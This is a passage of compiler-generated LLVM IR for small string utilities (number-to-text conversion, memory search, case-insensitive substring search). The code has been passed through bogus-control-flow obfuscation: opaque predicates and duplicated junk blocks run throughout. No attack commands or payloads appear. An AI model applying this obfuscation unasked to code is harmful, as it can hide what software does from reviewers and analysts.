  br i1 %129, label %originalBB20, label %originalBB20alteredBB

originalBB20:                                     ; preds = %originalBB20alteredBB, %121
  %130 = load i32, i32* %19, align 4
  %131 = add nsw i32 %130, 48
  store i32 %131, i32* %19, align 4
  %132 = load i32, i32* @x.71
  %133 = load i32, i32* @y.72
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBBpart231, label %originalBB20alteredBB

originalBBpart231:                                ; preds = %originalBB20
  br label %143

; <label>:140:                                    ; preds = %originalBBpart218
  %141 = load i32, i32* %19, align 4
  %142 = add nsw i32 %141, 55
  store i32 %142, i32* %19, align 4
  br label %143

; <label>:143:                                    ; preds = %140, %originalBBpart231
  %144 = load i32, i32* @x.71
  %145 = load i32, i32* @y.72
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBB33, label %originalBB33alteredBB

originalBB33:                                     ; preds = %originalBB33alteredBB, %143
  %152 = load i32, i32* %19, align 4
  %153 = trunc i32 %152 to i8
  %154 = load i32, i32* %18, align 4
  %155 = sext i32 %154 to i64
  %156 = getelementptr inbounds [34 x i8], [34 x i8]* %16, i64 0, i64 %155
  store i8 %153, i8* %156, align 1
  %157 = load i32, i32* %14, align 4
  %158 = load i32, i32* %20, align 4
  %159 = udiv i32 %158, %157
  store i32 %159, i32* %20, align 4
  %160 = load i32, i32* %18, align 4
  %161 = add nsw i32 %160, -1
  store i32 %161, i32* %18, align 4
  %162 = load i32, i32* @x.71
  %163 = load i32, i32* @y.72
  %164 = sub i32 %162, 1
  %165 = mul i32 %162, %164
  %166 = urem i32 %165, 2
  %167 = icmp eq i32 %166, 0
  %168 = icmp slt i32 %163, 10
  %169 = or i1 %167, %168
  br i1 %169, label %originalBBpart241, label %originalBB33alteredBB

originalBBpart241:                                ; preds = %originalBB33
  br label %80

; <label>:170:                                    ; preds = %originalBBpart212
  %171 = load i32, i32* %17, align 4
  %172 = icmp ne i32 %171, 0
  br i1 %172, label %173, label %193

; <label>:173:                                    ; preds = %170
  %174 = load i32, i32* @x.71
  %175 = load i32, i32* @y.72
  %176 = sub i32 %174, 1
  %177 = mul i32 %174, %176
  %178 = urem i32 %177, 2
  %179 = icmp eq i32 %178, 0
  %180 = icmp slt i32 %175, 10
  %181 = or i1 %179, %180
  br i1 %181, label %originalBB43, label %originalBB43alteredBB

originalBB43:                                     ; preds = %originalBB43alteredBB, %173
  %182 = load i32, i32* %18, align 4
  %183 = sext i32 %182 to i64
  %184 = getelementptr inbounds [34 x i8], [34 x i8]* %16, i64 0, i64 %183
  store i8 45, i8* %184, align 1
  %185 = load i32, i32* @x.71
  %186 = load i32, i32* @y.72
  %187 = sub i32 %185, 1
  %188 = mul i32 %185, %187
  %189 = urem i32 %188, 2
  %190 = icmp eq i32 %189, 0
  %191 = icmp slt i32 %186, 10
  %192 = or i1 %190, %191
  br i1 %192, label %originalBBpart245, label %originalBB43alteredBB

originalBBpart245:                                ; preds = %originalBB43
  br label %196

; <label>:193:                                    ; preds = %170
  %194 = load i32, i32* %18, align 4
  %195 = add nsw i32 %194, 1
  store i32 %195, i32* %18, align 4
  br label %196

; <label>:196:                                    ; preds = %193, %originalBBpart245
  %197 = load i8*, i8** %15, align 8
  %198 = load i32, i32* %18, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds [34 x i8], [34 x i8]* %16, i64 0, i64 %199
  %201 = call i32 @util_strcpy(i8* %197, i8* %200)
  br label %207

; <label>:202:                                    ; preds = %48
  %203 = load i8*, i8** %15, align 8
  %204 = getelementptr inbounds i8, i8* %203, i64 0
  store i8 48, i8* %204, align 1
  %205 = load i8*, i8** %15, align 8
  %206 = getelementptr inbounds i8, i8* %205, i64 1
  store i8 0, i8* %206, align 1
  br label %207

; <label>:207:                                    ; preds = %202, %196
  %208 = load i32, i32* @x.71
  %209 = load i32, i32* @y.72
  %210 = sub i32 %208, 1
  %211 = mul i32 %208, %210
  %212 = urem i32 %211, 2
  %213 = icmp eq i32 %212, 0
  %214 = icmp slt i32 %209, 10
  %215 = or i1 %213, %214
  br i1 %215, label %originalBB47, label %originalBB47alteredBB

originalBB47:                                     ; preds = %originalBB47alteredBB, %207
  %216 = load i8*, i8** %15, align 8
  store i8* %216, i8** %12, align 8
  %217 = load i32, i32* @x.71
  %218 = load i32, i32* @y.72
  %219 = sub i32 %217, 1
  %220 = mul i32 %217, %219
  %221 = urem i32 %220, 2
  %222 = icmp eq i32 %221, 0
  %223 = icmp slt i32 %218, 10
  %224 = or i1 %222, %223
  br i1 %224, label %originalBBpart249, label %originalBB47alteredBB

originalBBpart249:                                ; preds = %originalBB47
  br label %225

; <label>:225:                                    ; preds = %originalBBpart249, %originalBBpart24
  %226 = load i8*, i8** %12, align 8
  ret i8* %226

originalBBalteredBB:                              ; preds = %originalBB, %3
  %227 = alloca i8*, align 8
  %228 = alloca i32, align 4
  %229 = alloca i32, align 4
  %230 = alloca i8*, align 8
  %231 = alloca [34 x i8], align 16
  %232 = alloca i32, align 4
  %233 = alloca i32, align 4
  %234 = alloca i32, align 4
  %235 = alloca i32, align 4
  store i32 %0, i32* %228, align 4
  store i32 %1, i32* %229, align 4
  store i8* %2, i8** %230, align 8
  %236 = load i8*, i8** %230, align 8
  %237 = icmp eq i8* %236, null
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %31
  store i8* null, i8** %12, align 8
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %61
  store i32 0, i32* %17, align 4
  %238 = load i32, i32* %13, align 4
  store i32 %238, i32* %20, align 4
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %80
  %239 = load i32, i32* %20, align 4
  %240 = icmp ne i32 %239, 0
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %99
  %241 = load i32, i32* %20, align 4
  %242 = load i32, i32* %14, align 4
  %_ = sub i32 0, %241
  %gen = add i32 %_, %242
  %_15 = sub i32 %241, %242
  %gen16 = mul i32 %_15, %242
  %243 = urem i32 %241, %242
  store i32 %243, i32* %19, align 4
  %244 = load i32, i32* %19, align 4
  %245 = icmp slt i32 %244, 10
  br label %originalBB14

originalBB20alteredBB:                            ; preds = %originalBB20, %121
  %246 = load i32, i32* %19, align 4
  %_21 = sub i32 0, %246
  %gen22 = add i32 %_21, 48
  %_23 = shl i32 %246, 48
  %_24 = shl i32 %246, 48
  %_25 = sub i32 0, %246
  %gen26 = add i32 %_25, 48
  %_27 = shl i32 %246, 48
  %_28 = sub i32 %246, 48
  %gen29 = mul i32 %_28, 48
  %247 = add nsw i32 %246, 48
  store i32 %247, i32* %19, align 4
  br label %originalBB20

originalBB33alteredBB:                            ; preds = %originalBB33, %143
  %248 = load i32, i32* %19, align 4
  %249 = trunc i32 %248 to i8
  %250 = load i32, i32* %18, align 4
  %251 = sext i32 %250 to i64
  %252 = getelementptr inbounds [34 x i8], [34 x i8]* %16, i64 0, i64 %251
  store i8 %249, i8* %252, align 1
  %253 = load i32, i32* %14, align 4
  %254 = load i32, i32* %20, align 4
  %_34 = shl i32 %254, %253
  %255 = udiv i32 %254, %253
  store i32 %255, i32* %20, align 4
  %256 = load i32, i32* %18, align 4
  %_35 = shl i32 %256, -1
  %_36 = sub i32 0, %256
  %gen37 = add i32 %_36, -1
  %_38 = sub i32 0, %256
  %gen39 = add i32 %_38, -1
  %257 = add nsw i32 %256, -1
  store i32 %257, i32* %18, align 4
  br label %originalBB33

originalBB43alteredBB:                            ; preds = %originalBB43, %173
  %258 = load i32, i32* %18, align 4
  %259 = sext i32 %258 to i64
  %260 = getelementptr inbounds [34 x i8], [34 x i8]* %16, i64 0, i64 %259
  store i8 45, i8* %260, align 1
  br label %originalBB43

originalBB47alteredBB:                            ; preds = %originalBB47, %207
  %261 = load i8*, i8** %15, align 8
  store i8* %261, i8** %12, align 8
  br label %originalBB47
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_memsearch(i8*, i32, i8*, i32) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i32, align 4
  store i8* %0, i8** %6, align 8
  store i32 %1, i32* %7, align 4
  store i8* %2, i8** %8, align 8
  store i32 %3, i32* %9, align 4
  store i32 0, i32* %11, align 4
  %12 = load i32, i32* %9, align 4
  %13 = load i32, i32* %7, align 4
  %14 = icmp sgt i32 %12, %13
  br i1 %14, label %15, label %32

; <label>:15:                                     ; preds = %4
  %16 = load i32, i32* @x.73
  %17 = load i32, i32* @y.74
  %18 = sub i32 %16, 1
  %19 = mul i32 %16, %18
  %20 = urem i32 %19, 2
  %21 = icmp eq i32 %20, 0
  %22 = icmp slt i32 %17, 10
  %23 = or i1 %21, %22
  br i1 %23, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %15
  store i32 -1, i32* %5, align 4
  %24 = load i32, i32* @x.73
  %25 = load i32, i32* @y.74
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br label %114

; <label>:32:                                     ; preds = %4
  %33 = load i32, i32* @x.73
  %34 = load i32, i32* @y.74
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %32
  store i32 0, i32* %10, align 4
  %41 = load i32, i32* @x.73
  %42 = load i32, i32* @y.74
  %43 = sub i32 %41, 1
  %44 = mul i32 %41, %43
  %45 = urem i32 %44, 2
  %46 = icmp eq i32 %45, 0
  %47 = icmp slt i32 %42, 10
  %48 = or i1 %46, %47
  br i1 %48, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %49

; <label>:49:                                     ; preds = %110, %originalBBpart24
  %50 = load i32, i32* @x.73
  %51 = load i32, i32* @y.74
  %52 = sub i32 %50, 1
  %53 = mul i32 %50, %52
  %54 = urem i32 %53, 2
  %55 = icmp eq i32 %54, 0
  %56 = icmp slt i32 %51, 10
  %57 = or i1 %55, %56
  br i1 %57, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %49
  %58 = load i32, i32* %10, align 4
  %59 = load i32, i32* %7, align 4
  %60 = icmp slt i32 %58, %59
  %61 = load i32, i32* @x.73
  %62 = load i32, i32* @y.74
  %63 = sub i32 %61, 1
  %64 = mul i32 %61, %63
  %65 = urem i32 %64, 2
  %66 = icmp eq i32 %65, 0
  %67 = icmp slt i32 %62, 10
  %68 = or i1 %66, %67
  br i1 %68, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %60, label %69, label %113

; <label>:69:                                     ; preds = %originalBBpart28
  %70 = load i8*, i8** %6, align 8
  %71 = load i32, i32* %10, align 4
  %72 = sext i32 %71 to i64
  %73 = getelementptr inbounds i8, i8* %70, i64 %72
  %74 = load i8, i8* %73, align 1
  %75 = sext i8 %74 to i32
  %76 = load i8*, i8** %8, align 8
  %77 = load i32, i32* %11, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds i8, i8* %76, i64 %78
  %80 = load i8, i8* %79, align 1
  %81 = sext i8 %80 to i32
  %82 = icmp eq i32 %75, %81
  br i1 %82, label %83, label %108

; <label>:83:                                     ; preds = %69
  %84 = load i32, i32* %11, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %11, align 4
  %86 = load i32, i32* %9, align 4
  %87 = icmp eq i32 %85, %86
  br i1 %87, label %88, label %107

; <label>:88:                                     ; preds = %83
  %89 = load i32, i32* @x.73
  %90 = load i32, i32* @y.74
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %88
  %97 = load i32, i32* %10, align 4
  %98 = add nsw i32 %97, 1
  store i32 %98, i32* %5, align 4
  %99 = load i32, i32* @x.73
  %100 = load i32, i32* @y.74
  %101 = sub i32 %99, 1
  %102 = mul i32 %99, %101
  %103 = urem i32 %102, 2
  %104 = icmp eq i32 %103, 0
  %105 = icmp slt i32 %100, 10
  %106 = or i1 %104, %105
  br i1 %106, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %114

; <label>:107:                                    ; preds = %83
  br label %109

; <label>:108:                                    ; preds = %69
  store i32 0, i32* %11, align 4
  br label %109

; <label>:109:                                    ; preds = %108, %107
  br label %110

; <label>:110:                                    ; preds = %109
  %111 = load i32, i32* %10, align 4
  %112 = add nsw i32 %111, 1
  store i32 %112, i32* %10, align 4
  br label %49

; <label>:113:                                    ; preds = %originalBBpart28
  store i32 -1, i32* %5, align 4
  br label %114

; <label>:114:                                    ; preds = %113, %originalBBpart212, %originalBBpart2
  %115 = load i32, i32* @x.73
  %116 = load i32, i32* @y.74
  %117 = sub i32 %115, 1
  %118 = mul i32 %115, %117
  %119 = urem i32 %118, 2
  %120 = icmp eq i32 %119, 0
  %121 = icmp slt i32 %116, 10
  %122 = or i1 %120, %121
  br i1 %122, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %114
  %123 = load i32, i32* %5, align 4
  %124 = load i32, i32* @x.73
  %125 = load i32, i32* @y.74
  %126 = sub i32 %124, 1
  %127 = mul i32 %124, %126
  %128 = urem i32 %127, 2
  %129 = icmp eq i32 %128, 0
  %130 = icmp slt i32 %125, 10
  %131 = or i1 %129, %130
  br i1 %131, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  ret i32 %123

originalBBalteredBB:                              ; preds = %originalBB, %15
  store i32 -1, i32* %5, align 4
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %32
  store i32 0, i32* %10, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %49
  %132 = load i32, i32* %10, align 4
  %133 = load i32, i32* %7, align 4
  %134 = icmp slt i32 %132, %133
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %88
  %135 = load i32, i32* %10, align 4
  %_ = sub i32 0, %135
  %gen = add i32 %_, 1
  %136 = add nsw i32 %135, 1
  store i32 %136, i32* %5, align 4
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %114
  %137 = load i32, i32* %5, align 4
  br label %originalBB14
}

; Function Attrs: noinline nounwind uwtable
define i32 @util_stristr(i8*, i32, i8*) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca i32, align 4
  %7 = alloca i8*, align 8
  %8 = alloca i8*, align 8
  %9 = alloca i32, align 4
  %10 = alloca i32, align 4
  %11 = alloca i8, align 1
  %12 = alloca i8, align 1
  store i8* %0, i8** %5, align 8
  store i32 %1, i32* %6, align 4
  store i8* %2, i8** %7, align 8
  %13 = load i8*, i8** %5, align 8
  store i8* %13, i8** %8, align 8
  %14 = load i8*, i8** %7, align 8
  %15 = call i32 @util_strlen(i8* %14)
  store i32 %15, i32* %9, align 4
  store i32 0, i32* %10, align 4
  br label %16

; <label>:16:                                     ; preds = %originalBBpart244, %3
  %17 = load i32, i32* %6, align 4
  %18 = add nsw i32 %17, -1
  store i32 %18, i32* %6, align 4
  %19 = icmp sgt i32 %17, 0
  br i1 %19, label %20, label %243

; <label>:20:                                     ; preds = %16
  %21 = load i8*, i8** %8, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %8, align 8
  %23 = load i8, i8* %21, align 1
  store i8 %23, i8* %11, align 1
  %24 = load i8*, i8** %7, align 8
  %25 = load i32, i32* %10, align 4
  %26 = sext i32 %25 to i64
  %27 = getelementptr inbounds i8, i8* %24, i64 %26
  %28 = load i8, i8* %27, align 1
  store i8 %28, i8* %12, align 1
  %29 = load i8, i8* %11, align 1
  %30 = sext i8 %29 to i32
  %31 = icmp sge i32 %30, 65
  br i1 %31, label %32, label %56

; <label>:32:                                     ; preds = %20
  %33 = load i32, i32* @x.75
  %34 = load i32, i32* @y.76
  %35 = sub i32 %33, 1
  %36 = mul i32 %33, %35
  %37 = urem i32 %36, 2
  %38 = icmp eq i32 %37, 0
  %39 = icmp slt i32 %34, 10
  %40 = or i1 %38, %39
  br i1 %40, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %32
  %41 = load i8, i8* %11, align 1
  %42 = sext i8 %41 to i32
  %43 = icmp sle i32 %42, 90
  %44 = load i32, i32* @x.75
  %45 = load i32, i32* @y.76
  %46 = sub i32 %44, 1
  %47 = mul i32 %44, %46
  %48 = urem i32 %47, 2
  %49 = icmp eq i32 %48, 0
  %50 = icmp slt i32 %45, 10
  %51 = or i1 %49, %50
  br i1 %51, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %43, label %52, label %56

; <label>:52:                                     ; preds = %originalBBpart2
  %53 = load i8, i8* %11, align 1
  %54 = sext i8 %53 to i32
  %55 = or i32 %54, 96
  br label %75

; <label>:56:                                     ; preds = %originalBBpart2, %20
  %57 = load i32, i32* @x.75
  %58 = load i32, i32* @y.76
  %59 = sub i32 %57, 1
  %60 = mul i32 %57, %59
  %61 = urem i32 %60, 2
  %62 = icmp eq i32 %61, 0
  %63 = icmp slt i32 %58, 10
  %64 = or i1 %62, %63
  br i1 %64, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %56
  %65 = load i8, i8* %11, align 1
  %66 = sext i8 %65 to i32
  %67 = load i32, i32* @x.75
  %68 = load i32, i32* @y.76
  %69 = sub i32 %67, 1
  %70 = mul i32 %67, %69
  %71 = urem i32 %70, 2
  %72 = icmp eq i32 %71, 0
  %73 = icmp slt i32 %68, 10
  %74 = or i1 %72, %73
  br i1 %74, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %75

; <label>:75:                                     ; preds = %originalBBpart24, %52
  %76 = phi i32 [ %55, %52 ], [ %66, %originalBBpart24 ]
  %77 = load i32, i32* @x.75
  %78 = load i32, i32* @y.76
  %79 = sub i32 %77, 1
  %80 = mul i32 %77, %79
  %81 = urem i32 %80, 2
  %82 = icmp eq i32 %81, 0
  %83 = icmp slt i32 %78, 10
  %84 = or i1 %82, %83
  br i1 %84, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %75
  %85 = trunc i32 %76 to i8
  store i8 %85, i8* %11, align 1
  %86 = load i8, i8* %12, align 1
  %87 = sext i8 %86 to i32
  %88 = icmp sge i32 %87, 65
  %89 = load i32, i32* @x.75
  %90 = load i32, i32* @y.76
  %91 = sub i32 %89, 1
  %92 = mul i32 %89, %91
  %93 = urem i32 %92, 2
  %94 = icmp eq i32 %93, 0
  %95 = icmp slt i32 %90, 10
  %96 = or i1 %94, %95
  br i1 %96, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %88, label %97, label %121

; <label>:97:                                     ; preds = %originalBBpart28
  %98 = load i8, i8* %12, align 1
  %99 = sext i8 %98 to i32
  %100 = icmp sle i32 %99, 90
  br i1 %100, label %101, label %121

; <label>:101:                                    ; preds = %97
  %102 = load i32, i32* @x.75
  %103 = load i32, i32* @y.76
  %104 = sub i32 %102, 1
  %105 = mul i32 %102, %104
  %106 = urem i32 %105, 2
  %107 = icmp eq i32 %106, 0
  %108 = icmp slt i32 %103, 10
  %109 = or i1 %107, %108
  br i1 %109, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %101
  %110 = load i8, i8* %12, align 1
  %111 = sext i8 %110 to i32
  %112 = or i32 %111, 96
  %113 = load i32, i32* @x.75
  %114 = load i32, i32* @y.76
  %115 = sub i32 %113, 1
  %116 = mul i32 %113, %115
  %117 = urem i32 %116, 2
  %118 = icmp eq i32 %117, 0
  %119 = icmp slt i32 %114, 10
  %120 = or i1 %118, %119
  br i1 %120, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %140

; <label>:121:                                    ; preds = %97, %originalBBpart28
  %122 = load i32, i32* @x.75
  %123 = load i32, i32* @y.76
  %124 = sub i32 %122, 1
  %125 = mul i32 %122, %124
  %126 = urem i32 %125, 2
  %127 = icmp eq i32 %126, 0
  %128 = icmp slt i32 %123, 10
  %129 = or i1 %127, %128
  br i1 %129, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %121
  %130 = load i8, i8* %12, align 1
  %131 = sext i8 %130 to i32
  %132 = load i32, i32* @x.75
  %133 = load i32, i32* @y.76
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %140

; <label>:140:                                    ; preds = %originalBBpart216, %originalBBpart212
  %141 = phi i32 [ %112, %originalBBpart212 ], [ %131, %originalBBpart216 ]
  %142 = load i32, i32* @x.75
  %143 = load i32, i32* @y.76
  %144 = sub i32 %142, 1
  %145 = mul i32 %142, %144
  %146 = urem i32 %145, 2
  %147 = icmp eq i32 %146, 0
  %148 = icmp slt i32 %143, 10
  %149 = or i1 %147, %148
  br i1 %149, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %140
  %150 = trunc i32 %141 to i8
  store i8 %150, i8* %12, align 1
  %151 = load i8, i8* %11, align 1
  %152 = sext i8 %151 to i32
  %153 = load i8, i8* %12, align 1
  %154 = sext i8 %153 to i32
  %155 = icmp eq i32 %152, %154
  %156 = load i32, i32* @x.75
  %157 = load i32, i32* @y.76
  %158 = sub i32 %156, 1
  %159 = mul i32 %156, %158
  %160 = urem i32 %159, 2
  %161 = icmp eq i32 %160, 0
  %162 = icmp slt i32 %157, 10
  %163 = or i1 %161, %162
  br i1 %163, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %155, label %164, label %209

; <label>:164:                                    ; preds = %originalBBpart220
  %165 = load i32, i32* %10, align 4
  %166 = add nsw i32 %165, 1
  store i32 %166, i32* %10, align 4
  %167 = load i32, i32* %9, align 4
  %168 = icmp eq i32 %166, %167
  br i1 %168, label %169, label %192

; <label>:169:                                    ; preds = %164
  %170 = load i32, i32* @x.75
  %171 = load i32, i32* @y.76
  %172 = sub i32 %170, 1
  %173 = mul i32 %170, %172
  %174 = urem i32 %173, 2
  %175 = icmp eq i32 %174, 0
  %176 = icmp slt i32 %171, 10
  %177 = or i1 %175, %176
  br i1 %177, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %169
  %178 = load i8*, i8** %8, align 8
  %179 = load i8*, i8** %5, align 8
  %180 = ptrtoint i8* %178 to i64
  %181 = ptrtoint i8* %179 to i64
  %182 = sub i64 %180, %181
  %183 = trunc i64 %182 to i32
  store i32 %183, i32* %4, align 4
  %184 = load i32, i32* @x.75
  %185 = load i32, i32* @y.76
  %186 = sub i32 %184, 1
  %187 = mul i32 %184, %186
  %188 = urem i32 %187, 2
  %189 = icmp eq i32 %188, 0
  %190 = icmp slt i32 %185, 10
  %191 = or i1 %189, %190
  br i1 %191, label %originalBBpart232, label %originalBB22alteredBB

originalBBpart232:                                ; preds = %originalBB22
  br label %244

; <label>:192:                                    ; preds = %164
  %193 = load i32, i32* @x.75
  %194 = load i32, i32* @y.76
  %195 = sub i32 %193, 1
  %196 = mul i32 %193, %195
  %197 = urem i32 %196, 2
  %198 = icmp eq i32 %197, 0
  %199 = icmp slt i32 %194, 10
  %200 = or i1 %198, %199
  br i1 %200, label %originalBB34, label %originalBB34alteredBB

originalBB34:                                     ; preds = %originalBB34alteredBB, %192
  %201 = load i32, i32* @x.75
  %202 = load i32, i32* @y.76
  %203 = sub i32 %201, 1
  %204 = mul i32 %201, %203
  %205 = urem i32 %204, 2
  %206 = icmp eq i32 %205, 0
  %207 = icmp slt i32 %202, 10
  %208 = or i1 %206, %207
  br i1 %208, label %originalBBpart236, label %originalBB34alteredBB

originalBBpart236:                                ; preds = %originalBB34
  br label %226

; <label>:209:                                    ; preds = %originalBBpart220
  %210 = load i32, i32* @x.75
  %211 = load i32, i32* @y.76
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBB38, label %originalBB38alteredBB

originalBB38:                                     ; preds = %originalBB38alteredBB, %209
  store i32 0, i32* %10, align 4
  %218 = load i32, i32* @x.75
  %219 = load i32, i32* @y.76
  %220 = sub i32 %218, 1
  %221 = mul i32 %218, %220
  %222 = urem i32 %221, 2
  %223 = icmp eq i32 %222, 0
  %224 = icmp slt i32 %219, 10
  %225 = or i1 %223, %224
  br i1 %225, label %originalBBpart240, label %originalBB38alteredBB

originalBBpart240:                                ; preds = %originalBB38
  br label %226

; <label>:226:                                    ; preds = %originalBBpart240, %originalBBpart236
  %227 = load i32, i32* @x.75
  %228 = load i32, i32* @y.76
  %229 = sub i32 %227, 1
  %230 = mul i32 %227, %229
  %231 = urem i32 %230, 2
  %232 = icmp eq i32 %231, 0
  %233 = icmp slt i32 %228, 10
  %234 = or i1 %232, %233
  br i1 %234, label %originalBB42, label %originalBB42alteredBB

originalBB42:                                     ; preds = %originalBB42alteredBB, %226
  %235 = load i32, i32* @x.75
  %236 = load i32, i32* @y.76
  %237 = sub i32 %235, 1
  %238 = mul i32 %235, %237
  %239 = urem i32 %238, 2
  %240 = icmp eq i32 %239, 0
  %241 = icmp slt i32 %236, 10
  %242 = or i1 %240, %241
  br i1 %242, label %originalBBpart244, label %originalBB42alteredBB

originalBBpart244:                                ; preds = %originalBB42
  br label %16

; <label>:243:                                    ; preds = %16
  store i32 -1, i32* %4, align 4
  br label %244

; <label>:244:                                    ; preds = %243, %originalBBpart232
  %245 = load i32, i32* @x.75
  %246 = load i32, i32* @y.76
  %247 = sub i32 %245, 1
  %248 = mul i32 %245, %247
  %249 = urem i32 %248, 2
  %250 = icmp eq i32 %249, 0
  %251 = icmp slt i32 %246, 10
  %252 = or i1 %250, %251
  br i1 %252, label %originalBB46, label %originalBB46alteredBB

originalBB46:                                     ; preds = %originalBB46alteredBB, %244
  %253 = load i32, i32* %4, align 4
  %254 = load i32, i32* @x.75
  %255 = load i32, i32* @y.76
  %256 = sub i32 %254, 1
  %257 = mul i32 %254, %256
  %258 = urem i32 %257, 2
  %259 = icmp eq i32 %258, 0
  %260 = icmp slt i32 %255, 10
  %261 = or i1 %259, %260
  br i1 %261, label %originalBBpart248, label %originalBB46alteredBB

originalBBpart248:                                ; preds = %originalBB46
  ret i32 %253

originalBBalteredBB:                              ; preds = %originalBB, %32
  %262 = load i8, i8* %11, align 1
  %263 = sext i8 %262 to i32
  %264 = icmp sle i32 %263, 90
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %56
  %265 = load i8, i8* %11, align 1
  %266 = sext i8 %265 to i32
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %75
  %267 = trunc i32 %76 to i8
  store i8 %267, i8* %11, align 1
  %268 = load i8, i8* %12, align 1
  %269 = sext i8 %268 to i32
  %270 = icmp sge i32 %269, 65
  br label %originalBB6

originalBB10alteredBB:                            ; preds = %originalBB10, %101
  %271 = load i8, i8* %12, align 1
  %272 = sext i8 %271 to i32
  %273 = or i32 %272, 96
  br label %originalBB10

originalBB14alteredBB:                            ; preds = %originalBB14, %121
  %274 = load i8, i8* %12, align 1
  %275 = sext i8 %274 to i32
  br label %originalBB14

originalBB18alteredBB:                            ; preds = %originalBB18, %140
  %276 = trunc i32 %141 to i8
  store i8 %276, i8* %12, align 1
  %277 = load i8, i8* %11, align 1
  %278 = sext i8 %277 to i32
  %279 = load i8, i8* %12, align 1
  %280 = sext i8 %279 to i32
  %281 = icmp eq i32 %278, %280
  br label %originalBB18

originalBB22alteredBB:                            ; preds = %originalBB22, %169
  %282 = load i8*, i8** %8, align 8
  %283 = load i8*, i8** %5, align 8
  %284 = ptrtoint i8* %282 to i64
  %285 = ptrtoint i8* %283 to i64
  %_ = shl i64 %284, %285
  %_23 = sub i64 0, %284
  %gen = add i64 %_23, %285
  %_24 = sub i64 0, %284
  %gen25 = add i64 %_24, %285
  %_26 = sub i64 0, %284
  %gen27 = add i64 %_26, %285
  %_28 = sub i64 %284, %285
  %gen29 = mul i64 %_28, %285
  %_30 = shl i64 %284, %285
  %286 = sub i64 %284, %285
  %287 = trunc i64 %286 to i32
  store i32 %287, i32* %4, align 4
